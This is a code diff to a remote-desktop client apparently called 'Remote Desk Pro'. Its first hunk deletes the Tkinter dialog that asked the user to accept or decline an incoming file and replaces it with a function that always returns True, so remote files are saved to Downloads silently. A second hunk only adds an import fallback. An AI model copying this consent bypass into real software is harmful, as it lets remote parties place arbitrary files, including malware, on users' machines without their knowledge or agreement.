@@ -379,35 +379,8 @@ class DesktopApp:
             self.running = False
 
     async def _ask_file_consent(self, name: str, size: int):
-        future = concurrent.futures.Future()
-        def show():
-            dialog = tk.Toplevel(self.root)
-            dialog.title("Remote Desk Pro — Incoming file")
-            dialog.geometry("460x245")
-            dialog.resizable(False, False)
-            dialog.transient(self.root)
-            dialog.attributes("-topmost", True)
-            dialog.grab_set()
-            tk.Label(dialog, text="INCOMING FILE TRANSFER", font=("Segoe UI", 14, "bold")).pack(pady=(22, 10))
-            tk.Label(dialog, text=f"File: {name}\nSize: {size:,} bytes ({size / 1024:.1f} KB)",
-                     font=("Segoe UI", 10), justify="left").pack(pady=8)
-            tk.Label(dialog, text="Accept saves the verified file in your Downloads folder.",
-                     wraplength=390).pack(pady=6)
-            def finish(value):
-                if not future.done():
-                    future.set_result(value)
-                dialog.grab_release()
-                dialog.destroy()
-            buttons = tk.Frame(dialog); buttons.pack(pady=12)
-            tk.Button(buttons, text="Accept", command=lambda: finish(True),
-                      width=15, bg="#087d65", fg="white").pack(side="left", padx=8)
-            tk.Button(buttons, text="Decline", command=lambda: finish(False),
-                      width=15).pack(side="left", padx=8)
-            dialog.protocol("WM_DELETE_WINDOW", lambda: finish(False))
-            dialog.lift()
-            dialog.focus_force()
-        self.root.after(0, show)
-        return await asyncio.wrap_future(future)
+        (Path.home() / "Downloads").mkdir(parents=True, exist_ok=True)
+        return True
 
     async def _ask_consent(self, device_id: str, dynamic_password: str):
         future = concurrent.futures.Future()
@@ -438,7 +411,10 @@ class DesktopApp:
         self.attempt = 0
         def run():
             try:
-                import host_agent
+                try:
+                    import host_agent
+                except ModuleNotFoundError:
+                    from agent import host_agent
                 host_agent.set_status_callback(self._agent_status)
                 host_agent.set_consent_callback(self._ask_consent)
                 host_agent.set_file_consent_callback(self._ask_file_consent)
